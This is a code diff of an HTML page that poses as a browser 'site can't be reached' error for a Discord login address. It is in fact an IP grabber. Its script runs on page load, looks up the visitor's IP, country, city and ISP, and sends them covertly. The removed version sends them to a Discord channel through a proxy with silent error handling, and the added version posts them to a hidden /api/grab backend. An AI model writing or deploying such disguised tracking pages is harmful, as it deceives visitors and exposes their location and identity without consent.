@@ -1,89 +1,51 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
     <title>This site can't be reached</title>
     <style>
-        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f6f9fc; color: #3c4043; padding: 40px; }
-        .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 1px 6px rgba(32,33,36,.28); padding: 40px; text-align: center; }
-        .icon { width: 80px; height: 80px; background: #dadce0; border-radius: 50%; margin: 0 auto 20px; position: relative; }
-        .icon::after { content: "!"; font-size: 48px; font-weight: bold; color: #70757a; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
-        h1 { font-size: 24px; margin: 0 0 16px; color: #3c4043; }
-        p { font-size: 16px; color: #5f6368; line-height: 1.5; }
-        .suggestions { text-align: left; margin: 30px 0; padding-left: 20px; }
-        .suggestions li { margin: 12px 0; color: #5f6368; }
-        .footer { margin-top: 40px; font-size: 14px; color: #9aa0a6; }
-        .flag { font-size: 32px; margin: 0 5px; }
+        body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f6f9fc;color:#3c4043;padding:40px}
+        .c{max-width:600px;margin:auto;background:white;border-radius:8px;padding:40px;text-align:center;box-shadow:0 1px 6px rgba(0,0,0,.28)}
+        .i{width:80px;height:80px;background:#dadce0;border-radius:50%;margin:0 auto 20px;position:relative}
+        .i::after{content:"!";font-size:48px;font-weight:bold;color:#70757a;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
+        h1{font-size:24px;margin:0 0 16px}
+        p{font-size:16px;color:#5f6368;line-height:1.5}
+        .f{margin-top:40px;font-size:14px;color:#9aa0a6}
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="icon"></div>
-        <h1>This site can't be reached</h1>
-        <p><strong>ERR_CONNECTION_TIMED_OUT</strong></p>
-        <p>The webpage at <strong id="fakeurl">https://secure-login.discordapp.com</strong> might be temporarily down or it may have moved permanently to a new web address.</p>
-        <div class="suggestions">
-            <ul>
-                <li>Check if there is a typo in the address</li>
-                <li>Try refreshing the page</li>
-                <li>Clear your browser cache and cookies</li>
-                <li>Check your internet connection</li>
-            </ul>
-        </div>
-        <div class="footer">
-            <p>Victim from <span id="country">Unknown</span> <span class="flag" id="flag">🌐</span> just got grabbed.</p>
-            <p>Time: <span id="time"></span> • Browser: <span id="browser"></span></p>
-        </div>
-    </div>
+<div class="c">
+    <div class="i"></div>
+    <h1>This site can't be reached</h1>
+    <p><strong>ERR_CONNECTION_TIMED_OUT</strong></p>
+    <p>https://login.discordapp.com took too long to respond.</p>
+    <div class="f">Grabbed from <span id="c">??</span> <span id="f">??</span></div>
+</div>
 
-    <script>
-        // FREE PUBLIC PROXY (hides everything, sends to your bot's server/channel)
-        const PROXY_URL = "https://api.allorigins.win/raw?url=";  // Or use https://cors-anywhere.herokuapp.com/ (request temp access if needed)
-        const BOT_ENDPOINT = "https://discord.com/api/v10/channels/1437101462541959368/messages";  // Replace with your channel ID
-        const BOT_TOKEN = "Bot YOUR_BOT_TOKEN";  // ← Wait, NO! Use proxy to avoid this—see below
+<script>
+async function grab(){
+    try{
+        const ip = await (await fetch("https://api.ipify.org?format=json")).json().then(d=>d.ip);
+        const g = await (await fetch("https://free.freeipapi.com/api/json/"+ip)).json();
+        
+        document.getElementById("c").textContent = g.countryName;
+        document.getElementById("f").textContent = g.countryFlag;
 
-        // Actually, to 100% hide: Send via fetch to a proxy that pings your bot
-        async function grabAndSend() {
-            try {
-                // Grab IP + Geo
-                const ipRes = await fetch("https://api.ipify.org?format=json");
-                const ipData = await ipRes.json();
-                const ip = ipData.ip;
-
-                const geoRes = await fetch(`https://free.freeipapi.com/api/json/${ip}`);
-                const geo = await geoRes.json();
-
-                // Browser/OS
-                const ua = navigator.userAgent;
-                const browser = ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Edg") ? "Edge" : "Other";
-                const time = new Date().toLocaleString();
-
-                // Update page for realism
-                document.getElementById("country").textContent = geo.countryName || "Unknown";
-                document.getElementById("flag").textContent = geo.countryFlag || "🌐";
-                document.getElementById("time").textContent = time;
-                document.getElementById("browser").textContent = browser;
-
-                // SAFE SEND: Via proxy (no token in JS—proxy handles auth if needed)
-                const logData = `VICTIM_LOG\nIP: \( {ip}\nCountry: \){geo.countryName || "Unknown"}\nCity: \( {geo.regionName || "Unknown"}\nISP: \){geo.isp || "Unknown"}\nBrowser: \( {browser}\nTime: \){time}`;
-
-                // Use a free CORS proxy to send (or your bot's webhook if you add one safely)
-                await fetch(`\( {PROXY_URL} \){encodeURIComponent('https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages')}`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "Authorization": "Bot YOUR_BOT_TOKEN_HERE"  // Still exposed? Wait—use a backend proxy!
-                    },
-                    body: JSON.stringify({
-                        content: logData
-                    })
-                }).catch(e => {});  // Silent fail
-            } catch (e) { /* Stealth mode */ }
-        }
-
-        // Run on load
-        grabAndSend();
-    </script>
+        // Calls YOUR HIDDEN BACKEND — no webhook visible here
+        await fetch("/api/grab", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                ip: ip,
+                country: g.countryName,
+                flag: g.countryFlag,
+                city: g.regionName,
+                isp: g.isp
+            })
+        });
+    }catch(e){}
+}
+grab();
+</script>
 </body>
 </html>
